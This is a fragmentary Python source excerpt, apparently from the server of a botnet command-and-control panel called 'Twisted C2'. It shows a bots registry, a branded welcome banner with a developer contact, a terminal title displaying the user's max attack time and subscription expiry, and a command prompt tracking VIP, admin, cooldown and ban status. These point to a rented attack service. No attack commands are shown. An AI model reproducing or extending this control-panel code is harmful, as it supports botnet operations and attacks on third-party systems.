...
# Ensure bots exists before threads reference it and provide a lock for thread-safe access
bots = {}
...
banner = generate_gradient_text(f"""
                     ...
                     ══╦═════════════════════════════════╦══
             ╔═════════╩═════════════════════════════════╩═════════╗
             ║         Welcome To The Main Screen Of Twisted       ║
             ║           Type [help] to see the Commands           ║
             ║         Contact Dev - mail: dsc.gg/TwistedC2        ║
             ╚═════════════════════════════════════════════════════╝
...
def update_title(client, username, max_time, days_left):
    while 1:
        try:
            send(client, f'\33]0;Twisted | Connected as: [ {username} ] | Max time: [ {max_time}s ] | Expiry: [ {days_left} days ]\a', False)
            time.sleep(2)
        except:
            client.close()
...
def command_line(client, c_username, max_time, days_left, cons, c_vip, c_admin, expiry_date, cooldown, c_ban):
    ...
    for x2 in banner2.split('\n'):
        send(client, x2)
    prompt = generate_gradient_text(f"{c_username} • TwistedC2 ►► ", start_color, end_color)
...
def handle_client(client, address):
    send(client, f'\33]0;Twisted C2 | Login\a', False)
